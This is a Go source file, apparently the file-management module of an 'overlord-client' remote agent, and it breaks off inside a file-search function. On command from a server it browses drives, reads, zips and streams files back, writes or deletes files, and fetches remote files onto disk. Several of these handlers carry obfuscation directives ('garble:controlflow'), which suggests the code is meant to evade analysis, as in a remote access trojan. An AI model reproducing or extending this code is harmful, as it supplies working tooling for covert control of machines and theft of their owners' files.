package handlers

import (
	"archive/zip"
	"bufio"
	"bytes"
	"context"
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"errors"
	"fmt"
	"hash"
	"hash/crc32"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unicode/utf8"

	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

const maxChunkSize = 4 * 1024 * 1024

type pendingUpload struct {
	file            *os.File
	tmpPath         string
	finalPath       string
	total           int64
	receivedBytes   int64
	receivedOffsets map[int64]int64
	chunkSize       int64
	expectedChunks  int
	transferID      string
}

var (
	pendingUploadsMu sync.Mutex
	pendingUploads   = map[string]*pendingUpload{}
)

func uploadKey(path, transferID string) string {
	if transferID != "" {
		return transferID
	}
	return path
}

func cleanupPendingUpload(key string, pending *pendingUpload) {
	pendingUploadsMu.Lock()
	delete(pendingUploads, key)
	pendingUploadsMu.Unlock()
	if pending == nil {
		return
	}
	if pending.file != nil {
		_ = pending.file.Close()
	}
	if pending.tmpPath != "" {
		_ = os.Remove(pending.tmpPath)
	}
}

func HandleFileList(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	log.Printf("file_list: %s", path)

	if path == "" {
		path = "."
	}

	if path == "." && runtime.GOOS == "windows" {
		return listWindowsDrives(ctx, env, cmdID)
	}

	if path == "." && runtime.GOOS != "windows" {
		if homeDir, err := os.UserHomeDir(); err == nil {
			path = homeDir
		}
	}

	absPath, err := filepath.Abs(path)
	if err == nil {
		path = absPath
	}

	entries := []wire.FileEntry{}
	var errMsg string

	dirEntries, err := os.ReadDir(path)
	if err != nil {
		errMsg = err.Error()
		log.Printf("file_list error: %v", err)
	} else {
		for _, entry := range dirEntries {
			info, err := entry.Info()
			if err != nil {
				continue
			}

			fullPath := filepath.Join(path, entry.Name())
			fileEntry := wire.FileEntry{
				Name:    entry.Name(),
				Path:    fullPath,
				IsDir:   entry.IsDir(),
				Size:    info.Size(),
				ModTime: info.ModTime().Unix(),
			}

			enrichFileEntry(&fileEntry, info)

			entries = append(entries, fileEntry)
		}
	}

	result := wire.FileListResult{
		Type:             "file_list_result",
		CommandID:        cmdID,
		Path:             path,
		Entries:          entries,
		Error:            errMsg,
		AccessDenied:     isFileAccessDenied(err),
		CanRequestAccess: canRequestFolderAccess(err),
		AccessHelp:       folderAccessHelp(err),
	}

	return wire.WriteMsg(ctx, env.Conn, result)
}

func isFileAccessDenied(err error) bool {
	return err != nil && errors.Is(err, os.ErrPermission)
}

func canRequestFolderAccess(err error) bool {
	return runtime.GOOS == "darwin" && isFileAccessDenied(err)
}

func folderAccessHelp(err error) string {
	if !canRequestFolderAccess(err) {
		return ""
	}
	return "macOS blocked this folder. Ask the user to allow access in Privacy & Security, then refresh this folder."
}

func HandleFileRequestAccess(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	if runtime.GOOS != "darwin" {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   "folder access requests are only available on macOS",
		})
	}

	if strings.TrimSpace(path) == "" {
		path = "."
	}
	if absPath, err := filepath.Abs(path); err == nil {
		path = absPath
	}

	settingsURL := "x-apple.systempreferences:com.apple.preference.security?Privacy_FilesAndFolders"
	if err := exec.CommandContext(ctx, "open", settingsURL).Run(); err != nil {
		_ = exec.CommandContext(ctx, "open", "x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles").Run()
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   fmt.Sprintf("could not open macOS Privacy settings: %v", err),
		})
	}

	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        true,
		Message:   fmt.Sprintf("opened macOS Privacy settings for folder access; ask the user to allow access for this app, then refresh %s", path),
	})
}

func listWindowsDrives(ctx context.Context, env *agentRuntime.Env, cmdID string) error {
	entries := []wire.FileEntry{}

	for drive := 'A'; drive <= 'Z'; drive++ {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			entry := wire.FileEntry{
				Name:    string(drive) + ":",
				Path:    drivePath,
				IsDir:   true,
				Size:    0,
				ModTime: time.Now().Unix(),
			}
			if free, total, fs, ok := DiskUsage(drivePath); ok {
				entry.FreeBytes = free
				entry.TotalBytes = total
				entry.FSType = fs
			}
			entries = append(entries, entry)
		}
	}

	result := wire.FileListResult{
		Type:      "file_list_result",
		CommandID: cmdID,
		Path:      ".",
		Entries:   entries,
		Error:     "",
	}

	return wire.WriteMsg(ctx, env.Conn, result)
}

const filePeekMaxBytes = 4096

func HandleFilePeek(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, requestedBytes int) error {
	log.Printf("file_peek: %s", path)

	if requestedBytes <= 0 || requestedBytes > filePeekMaxBytes {
		requestedBytes = filePeekMaxBytes
	}

	info, err := os.Stat(path)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.FilePeekResult{
			Type:      "file_peek_result",
			CommandID: cmdID,
			Path:      path,
			Error:     err.Error(),
		})
	}

	if info.IsDir() {
		return wire.WriteMsg(ctx, env.Conn, wire.FilePeekResult{
			Type:      "file_peek_result",
			CommandID: cmdID,
			Path:      path,
			Size:      info.Size(),
			Error:     "path is a directory",
		})
	}

	f, err := os.Open(path)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.FilePeekResult{
			Type:      "file_peek_result",
			CommandID: cmdID,
			Path:      path,
			Size:      info.Size(),
			Error:     err.Error(),
		})
	}
	defer f.Close()

	buf := make([]byte, requestedBytes)
	n, err := io.ReadFull(f, buf)
	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
		return wire.WriteMsg(ctx, env.Conn, wire.FilePeekResult{
			Type:      "file_peek_result",
			CommandID: cmdID,
			Path:      path,
			Size:      info.Size(),
			Error:     err.Error(),
		})
	}
	data := buf[:n]

	return wire.WriteMsg(ctx, env.Conn, wire.FilePeekResult{
		Type:      "file_peek_result",
		CommandID: cmdID,
		Path:      path,
		Data:      data,
		Size:      info.Size(),
		IsText:    looksLikeText(data),
	})
}

func looksLikeText(data []byte) bool {
	if len(data) == 0 {
		return true
	}
	if !utf8.Valid(data) {
		return false
	}
	for _, b := range data {
		if b == 0 {
			return false
		}
	}
	return true
}

func HandleFileHash(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, algorithm string) error {
	log.Printf("file_hash: %s algo=%s", path, algorithm)

	algorithm = strings.ToLower(strings.TrimSpace(algorithm))
	if algorithm == "" {
		algorithm = "sha256"
	}

	var h hash.Hash
	switch algorithm {
	case "sha256":
		h = sha256.New()
	case "sha1":
		h = sha1.New()
	case "md5":
		h = md5.New()
	case "crc32":
		h = crc32.NewIEEE()
	default:
		return wire.WriteMsg(ctx, env.Conn, wire.FileHashResult{
			Type:      "file_hash_result",
			CommandID: cmdID,
			Path:      path,
			Algorithm: algorithm,
			Error:     "unsupported algorithm",
		})
	}

	info, err := os.Stat(path)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.FileHashResult{
			Type:      "file_hash_result",
			CommandID: cmdID,
			Path:      path,
			Algorithm: algorithm,
			Error:     err.Error(),
		})
	}
	if info.IsDir() {
		return wire.WriteMsg(ctx, env.Conn, wire.FileHashResult{
			Type:      "file_hash_result",
			CommandID: cmdID,
			Path:      path,
			Algorithm: algorithm,
			Error:     "path is a directory",
		})
	}

	f, err := os.Open(path)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.FileHashResult{
			Type:      "file_hash_result",
			CommandID: cmdID,
			Path:      path,
			Algorithm: algorithm,
			Error:     err.Error(),
		})
	}
	defer f.Close()

	if _, err := io.Copy(h, f); err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.FileHashResult{
			Type:      "file_hash_result",
			CommandID: cmdID,
			Path:      path,
			Algorithm: algorithm,
			Error:     err.Error(),
		})
	}

	return wire.WriteMsg(ctx, env.Conn, wire.FileHashResult{
		Type:      "file_hash_result",
		CommandID: cmdID,
		Path:      path,
		Algorithm: algorithm,
		Digest:    hex.EncodeToString(h.Sum(nil)),
		Size:      info.Size(),
	})
}

func HandleFileDownload(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	log.Printf("file_download: %s", path)

	file, err := os.Open(path)
	if err != nil {
		result := wire.FileDownload{
			Type:      "file_download",
			CommandID: cmdID,
			Path:      path,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	stat, err := file.Stat()
	if err != nil {
		_ = file.Close()
		result := wire.FileDownload{
			Type:      "file_download",
			CommandID: cmdID,
			Path:      path,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	total := stat.Size()
	chunksTotal := 0
	if total > 0 {
		chunksTotal = int((total + int64(maxChunkSize) - 1) / int64(maxChunkSize))
	}

	type readChunk struct {
		data []byte
		off  int64
		idx  int
		err  error
	}

	readCtx, cancelReader := context.WithCancel(ctx)
	pipe := make(chan readChunk, 2)
	done := make(chan struct{})

	go func() {
		defer close(done)
		defer close(pipe)
		defer file.Close()
		offset := int64(0)
		idx := 0
		for {
			buf := make([]byte, maxChunkSize)
			n, rerr := io.ReadFull(file, buf)
			if n > 0 {
				select {
				case <-readCtx.Done():
					return
				case pipe <- readChunk{data: buf[:n], off: offset, idx: idx}:
				}
				offset += int64(n)
				idx++
			}
			if rerr == nil {
				continue
			}
			if rerr == io.EOF || rerr == io.ErrUnexpectedEOF {
				return
			}
			select {
			case <-readCtx.Done():
			case pipe <- readChunk{err: rerr, off: offset, idx: idx}:
			}
			return
		}
	}()

	defer func() {
		cancelReader()
		<-done
	}()

	for chunk := range pipe {
		if chunk.err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.FileDownload{
				Type:        "file_download",
				CommandID:   cmdID,
				Path:        path,
				Error:       chunk.err.Error(),
				Offset:      chunk.off,
				Total:       total,
				ChunkIndex:  chunk.idx,
				ChunksTotal: chunksTotal,
			})
		}
		msg := wire.FileDownload{
			Type:        "file_download",
			CommandID:   cmdID,
			Path:        path,
			Data:        chunk.data,
			Offset:      chunk.off,
			Total:       total,
			ChunkIndex:  chunk.idx,
			ChunksTotal: chunksTotal,
		}
		if err := wire.WriteMsg(ctx, env.Conn, msg); err != nil {
			return err
		}
	}

	log.Printf("file_download complete: %s (%d bytes)", path, total)
	return nil
}

func HandleFileUpload(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, data []byte, offset int64, total int64, transferID string) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	if total > 0 {
		key := uploadKey(path, transferID)
		pendingUploadsMu.Lock()
		pending := pendingUploads[key]
		pendingUploadsMu.Unlock()

		if pending == nil {
			log.Printf("file_upload start: %s (total: %d bytes)", path, total)
			dir := filepath.Dir(path)
			if dir != "." {
				if err := os.MkdirAll(dir, 0755); err != nil {
					result := wire.FileUploadResult{
						Type:       "file_upload_result",
						CommandID:  cmdID,
						TransferID: transferID,
						Path:       path,
						OK:         false,
						Error:      err.Error(),
					}
					return wire.WriteMsg(ctx, env.Conn, result)
				}
			}

			tmpPath := path + ".uploading"
			if transferID != "" {
				tmpPath = path + ".uploading." + transferID
			}
			file, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				result := wire.FileUploadResult{
					Type:       "file_upload_result",
					CommandID:  cmdID,
					TransferID: transferID,
					Path:       path,
					OK:         false,
					Error:      err.Error(),
				}
				return wire.WriteMsg(ctx, env.Conn, result)
			}

			pending = &pendingUpload{
				file:            file,
				tmpPath:         tmpPath,
				finalPath:       path,
				total:           total,
				receivedOffsets: map[int64]int64{},
				transferID:      transferID,
			}

			pendingUploadsMu.Lock()
			pendingUploads[key] = pending
			pendingUploadsMu.Unlock()
		}

		end := offset + int64(len(data))
		if offset < 0 || end > pending.total {
			cleanupPendingUpload(key, pending)
			result := wire.FileUploadResult{
				Type:       "file_upload_result",
				CommandID:  cmdID,
				TransferID: transferID,
				Path:       path,
				OK:         false,
				Offset:     offset,
				Size:       int64(len(data)),
				Received:   pending.receivedBytes,
				Total:      pending.total,
				Error:      "upload chunk exceeds declared total size",
			}
			return wire.WriteMsg(ctx, env.Conn, result)
		}

		if pending.chunkSize == 0 && len(data) > 0 {
			pending.chunkSize = int64(len(data))
			pending.expectedChunks = int((pending.total + pending.chunkSize - 1) / pending.chunkSize)
		}

		if pending.file != nil {
			if _, err := pending.file.WriteAt(data, offset); err != nil {
				cleanupPendingUpload(key, pending)
				result := wire.FileUploadResult{
					Type:       "file_upload_result",
					CommandID:  cmdID,
					TransferID: transferID,
					Path:       path,
					OK:         false,
					Offset:     offset,
					Size:       int64(len(data)),
					Received:   pending.receivedBytes,
					Total:      pending.total,
					Error:      err.Error(),
				}
				return wire.WriteMsg(ctx, env.Conn, result)
			}
		}

		if _, exists := pending.receivedOffsets[offset]; !exists {
			pending.receivedOffsets[offset] = int64(len(data))
			pending.receivedBytes += int64(len(data))
		}

		hasAllChunks := pending.expectedChunks > 0
		if hasAllChunks {
			hasAllChunks = len(pending.receivedOffsets) >= pending.expectedChunks
		}

		if pending.total > 0 && pending.receivedBytes >= pending.total && hasAllChunks {
			if pending.file != nil {
				_ = pending.file.Sync()
				_ = pending.file.Close()
			}
			_ = os.Remove(pending.finalPath)
			if err := os.Rename(pending.tmpPath, pending.finalPath); err != nil {
				cleanupPendingUpload(key, pending)
				result := wire.FileUploadResult{
					Type:       "file_upload_result",
					CommandID:  cmdID,
					TransferID: transferID,
					Path:       path,
					OK:         false,
					Offset:     offset,
					Size:       int64(len(data)),
					Received:   pending.receivedBytes,
					Total:      pending.total,
					Error:      err.Error(),
				}
				return wire.WriteMsg(ctx, env.Conn, result)
			}
			log.Printf("file_upload complete: %s (%d bytes)", path, pending.total)
			cleanupPendingUpload(key, pending)
		}

		result := wire.FileUploadResult{
			Type:       "file_upload_result",
			CommandID:  cmdID,
			TransferID: transferID,
			Path:       path,
			OK:         true,
			Offset:     offset,
			Size:       int64(len(data)),
			Received:   pending.receivedBytes,
			Total:      pending.total,
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	dir := filepath.Dir(path)
	log.Printf("file_upload start: %s", path)
	if dir != "." {
		if err := os.MkdirAll(dir, 0755); err != nil {
			result := wire.FileUploadResult{
				Type:       "file_upload_result",
				CommandID:  cmdID,
				TransferID: transferID,
				Path:       path,
				OK:         false,
				Error:      err.Error(),
			}
			return wire.WriteMsg(ctx, env.Conn, result)
		}
	}

	flag := os.O_CREATE | os.O_WRONLY
	if offset == 0 {
		flag |= os.O_TRUNC
	}

	file, err := os.OpenFile(path, flag, 0644)
	if err != nil {
		result := wire.FileUploadResult{
			Type:       "file_upload_result",
			CommandID:  cmdID,
			TransferID: transferID,
			Path:       path,
			OK:         false,
			Error:      err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}
	defer file.Close()

	if offset > 0 {
		if _, err = file.Seek(offset, 0); err != nil {
			result := wire.FileUploadResult{
				Type:       "file_upload_result",
				CommandID:  cmdID,
				TransferID: transferID,
				Path:       path,
				OK:         false,
				Offset:     offset,
				Size:       int64(len(data)),
				Error:      err.Error(),
			}
			return wire.WriteMsg(ctx, env.Conn, result)
		}
	}

	if _, err = file.Write(data); err != nil {
		result := wire.FileUploadResult{
			Type:       "file_upload_result",
			CommandID:  cmdID,
			TransferID: transferID,
			Path:       path,
			OK:         false,
			Offset:     offset,
			Size:       int64(len(data)),
			Error:      err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	log.Printf("file_upload complete: %s (%d bytes)", path, offset+int64(len(data)))

	result := wire.FileUploadResult{
		Type:       "file_upload_result",
		CommandID:  cmdID,
		TransferID: transferID,
		Path:       path,
		OK:         true,
		Offset:     offset,
		Size:       int64(len(data)),
		Received:   offset + int64(len(data)),
		Total:      total,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

type progressReader struct {
	r     io.Reader
	bytes atomic.Int64
}

func (p *progressReader) Read(b []byte) (int, error) {
	n, err := p.r.Read(b)
	if n > 0 {
		p.bytes.Add(int64(n))
	}
	return n, err
}

const (
	httpUploadMaxAttempts  = 6
	httpUploadStallTimeout = 45 * time.Second
	httpUploadInitBackoff  = 1 * time.Second
	httpUploadMaxBackoff   = 30 * time.Second
)

func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID string, destPath string, sourceURL string, expectedSize int64) error {
	parsed, err := url.Parse(strings.TrimSpace(sourceURL))
	if err != nil || parsed == nil || parsed.Host == "" {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "invalid upload url"})
	}
	if parsed.Scheme != "https" && parsed.Scheme != "http" {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "unsupported upload url scheme"})
	}

	tlsConfig := &tls.Config{InsecureSkipVerify: env.Cfg.TLSInsecureSkipVerify, MinVersion: tls.VersionTLS12}
	if caPath := strings.TrimSpace(env.Cfg.TLSCAPath); caPath != "" {
		caBytes, err := os.ReadFile(caPath)
		if err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: fmt.Sprintf("failed to read TLS CA: %v", err)})
		}
		pool := x509.NewCertPool()
		if !pool.AppendCertsFromPEM(caBytes) {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "failed to parse TLS CA"})
		}
		tlsConfig.RootCAs = pool
	}

	transport := &http.Transport{
		TLSClientConfig:       tlsConfig,
		ResponseHeaderTimeout: 30 * time.Second,
		TLSHandshakeTimeout:   20 * time.Second,
		IdleConnTimeout:       60 * time.Second,
		DisableCompression:    true,
	}
	client := &http.Client{Transport: transport}

	dir := filepath.Dir(destPath)
	if dir != "." {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
		}
	}

	tmpPath := destPath + ".httpuploading"
	f, err := os.OpenFile(tmpPath, os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0644)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
	}

	var lastErr error
	backoff := httpUploadInitBackoff

	for attempt := 1; attempt <= httpUploadMaxAttempts; attempt++ {
		offset, seekErr := f.Seek(0, io.SeekEnd)
		if seekErr != nil {
			_ = f.Close()
			_ = os.Remove(tmpPath)
			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: seekErr.Error()})
		}
		if expectedSize > 0 && offset >= expectedSize {
			break
		}

		attemptCtx, attemptCancel := context.WithCancel(ctx)

		req, reqErr := http.NewRequestWithContext(attemptCtx, http.MethodGet, parsed.String(), nil)
		if reqErr != nil {
			attemptCancel()
			lastErr = reqErr
			break
		}
		if token := strings.TrimSpace(env.Cfg.AgentToken); token != "" {
			req.Header.Set("x-agent-token", token)
		}
		if id := strings.TrimSpace(env.Cfg.ID); id != "" {
			req.Header.Set("x-overlord-client-id", id)
		}
		if offset > 0 {
			req.Header.Set("Range", fmt.Sprintf("bytes=%d-", offset))
		}

		resp, doErr := client.Do(req)
		if doErr != nil {
			attemptCancel()
			lastErr = doErr
			if ctx.Err() != nil {
				break
			}
			sleepBackoff(ctx, backoff)
			backoff = nextBackoff(backoff)
			continue
		}

		if offset > 0 && resp.StatusCode == http.StatusOK {
			if _, err := f.Seek(0, io.SeekStart); err != nil {
				_ = resp.Body.Close()
				attemptCancel()
				_ = f.Close()
				_ = os.Remove(tmpPath)
				return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
			}
			if err := f.Truncate(0); err != nil {
				_ = resp.Body.Close()
				attemptCancel()
				_ = f.Close()
				_ = os.Remove(tmpPath)
				return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
			}
			offset = 0
		}

		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
			status := resp.StatusCode
			_ = resp.Body.Close()
			attemptCancel()
			lastErr = fmt.Errorf("upload fetch failed: status %d", status)
			// 4xx (not 416) won't get better on retry — bail.
			if status >= 400 && status < 500 && status != http.StatusRequestedRangeNotSatisfiable {
				break
			}
			sleepBackoff(ctx, backoff)
			backoff = nextBackoff(backoff)
			continue
		}

		pr := &progressReader{r: resp.Body}
		watchdogDone := make(chan struct{})
		go func() {
			ticker := time.NewTicker(httpUploadStallTimeout / 3)
			defer ticker.Stop()
			last := pr.bytes.Load()
			lastChange := time.Now()
			for {
				select {
				case <-watchdogDone:
					return
				case <-attemptCtx.Done():
					return
				case <-ticker.C:
					cur := pr.bytes.Load()
					if cur != last {
						last = cur
						lastChange = time.Now()
						continue
					}
					if time.Since(lastChange) >= httpUploadStallTimeout {
						attemptCancel()
						return
					}
				}
			}
		}()

		n, copyErr := io.Copy(f, pr)
		close(watchdogDone)
		_ = resp.Body.Close()
		attemptCancel()

		if copyErr == nil {
			lastErr = nil
			_ = n
			break
		}

		lastErr = copyErr
		if ctx.Err() != nil {
			break
		}
		sleepBackoff(ctx, backoff)
		backoff = nextBackoff(backoff)
	}

	if lastErr != nil {
		_ = f.Close()
		_ = os.Remove(tmpPath)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: lastErr.Error()})
	}

	written, _ := f.Seek(0, io.SeekEnd)
	if closeErr := f.Close(); closeErr != nil {
		_ = os.Remove(tmpPath)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: closeErr.Error()})
	}

	if expectedSize > 0 && written != expectedSize {
		_ = os.Remove(tmpPath)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: fmt.Sprintf("upload size mismatch: got %d, expected %d", written, expectedSize)})
	}

	_ = os.Remove(destPath)
	if err := os.Rename(tmpPath, destPath); err != nil {
		_ = os.Remove(tmpPath)
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
	}

	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
}

func sleepBackoff(ctx context.Context, d time.Duration) {
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-ctx.Done():
	case <-t.C:
	}
}

func nextBackoff(d time.Duration) time.Duration {
	next := d * 2
	if next > httpUploadMaxBackoff {
		return httpUploadMaxBackoff
	}
	return next
}

func HandleFileDelete(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	log.Printf("file_delete: %s", path)

	err := os.RemoveAll(path)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileMkdir(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	log.Printf("file_mkdir: %s", path)

	err := os.MkdirAll(path, 0755)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileZip(ctx context.Context, env *agentRuntime.Env, cmdID string, sourcePath string) error {
	log.Printf("file_zip: %s", sourcePath)

	zipPath := sourcePath + ".zip"
	zipFile, err := os.Create(zipPath)
	if err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	totalFiles := 0
	filepath.Walk(sourcePath, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			totalFiles++
		}
		return nil
	})

	progressMsg := wire.CommandResult{
		Type:      "command_progress",
		CommandID: cmdID,
		OK:        true,
		Message:   fmt.Sprintf("Zipping 0/%d files...", totalFiles),
	}
	wire.WriteMsg(ctx, env.Conn, progressMsg)

	processedFiles := 0
	lastProgressUpdate := time.Now()

	err = filepath.Walk(sourcePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(sourcePath, path)
		if err != nil {
			return err
		}
		header.Name = relPath

		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}

		if !info.IsDir() {
			file, err := os.Open(path)
			if err != nil {
				return err
			}
			defer file.Close()
			_, err = io.Copy(writer, file)
			if err != nil {
				return err
			}

			processedFiles++

			now := time.Now()
			if now.Sub(lastProgressUpdate) > 500*time.Millisecond || processedFiles%10 == 0 {
				progress := wire.CommandResult{
					Type:      "command_progress",
					CommandID: cmdID,
					OK:        true,
					Message:   fmt.Sprintf("Zipping %d/%d files...", processedFiles, totalFiles),
				}
				wire.WriteMsg(ctx, env.Conn, progress)
				lastProgressUpdate = now
			}
		}

		return nil
	})

	if err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	zipWriter.Close()
	zipFile.Close()

	finalProgress := wire.CommandResult{
		Type:      "command_progress",
		CommandID: cmdID,
		OK:        true,
		Message:   fmt.Sprintf("Zip complete. %d files compressed.", processedFiles),
	}
	wire.WriteMsg(ctx, env.Conn, finalProgress)

	time.Sleep(100 * time.Millisecond)
	goSafe("file download", nil, func() {
		HandleFileDownload(ctx, env, cmdID, zipPath)
	})

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        true,
		Message:   "Zip created: " + zipPath,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileRead(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, maxSize int64) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	log.Printf("file_read: %s", path)

	if maxSize == 0 {
		maxSize = 10 * 1024 * 1024
	}

	info, err := os.Stat(path)
	if err != nil {
		result := wire.FileReadResult{
			Type:      "file_read_result",
			CommandID: cmdID,
			Path:      path,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	if info.Size() > maxSize {
		result := wire.FileReadResult{
			Type:      "file_read_result",
			CommandID: cmdID,
			Path:      path,
			Error:     fmt.Sprintf("file too large: %d bytes (max: %d)", info.Size(), maxSize),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		result := wire.FileReadResult{
			Type:      "file_read_result",
			CommandID: cmdID,
			Path:      path,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	isBinary := !utf8.Valid(data)

	result := wire.FileReadResult{
		Type:      "file_read_result",
		CommandID: cmdID,
		Path:      path,
		Content:   string(data),
		IsBinary:  isBinary,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileWrite(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, content string) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	log.Printf("file_write: %s", path)

	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	err := os.WriteFile(path, []byte(content), 0644)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileSearch(ctx context.Context, env *agentRuntime.Env, cmdID string, searchID string, basePath string, pattern string, searchContent bool, maxResults int) error {
	log.Printf("file_search: path=%s pattern=%s content=%v", basePath, pattern, searchContent)

	if maxResults == 0 {
		maxResults = 1000
	}

	results := []wire.FileSearchMatch{}
	matchCount := 0

	err := filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		if matchCount >= maxResults {
			return filepath.SkipAll
		}

		if !searchContent {
			if strings.Contains(strings.ToLower(info.Name()), strings.ToLower(pattern)) {
				results = append(results, wire.FileSearchMatch{
					Path: path,
				})
				matchCount++
			}
			return nil
		}

		if !info.IsDir() && info.Size() < 10*1024*1024 {
			data, err := os.ReadFile(path)
			if err != nil || !utf8.Valid(data) {
				return nil
			}

			scanner := bufio.NewScanner(bytes.NewReader(data))
			lineNum := 1
			for scanner.Scan() {
				line := scanner.Text()
				if strings.Contains(strings.ToLower(line), strings.ToLower(pattern)) {
